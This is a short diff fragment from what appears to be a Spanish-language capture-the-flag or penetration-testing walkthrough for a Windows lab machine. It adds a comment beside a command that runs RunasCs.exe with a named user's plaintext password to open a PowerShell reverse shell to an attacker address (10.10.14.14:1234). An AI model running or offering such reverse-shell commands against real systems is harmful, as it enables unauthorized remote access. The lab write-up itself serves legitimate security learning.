@@ -283,6 +283,7 @@ gpupdate.exe /force
 
 - Nos mandamos revershell
 ```bash
+#Cambiar a cmd.exe si no
 .\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' powershell.exe -r 10.10.14.14:1234
 ```
 
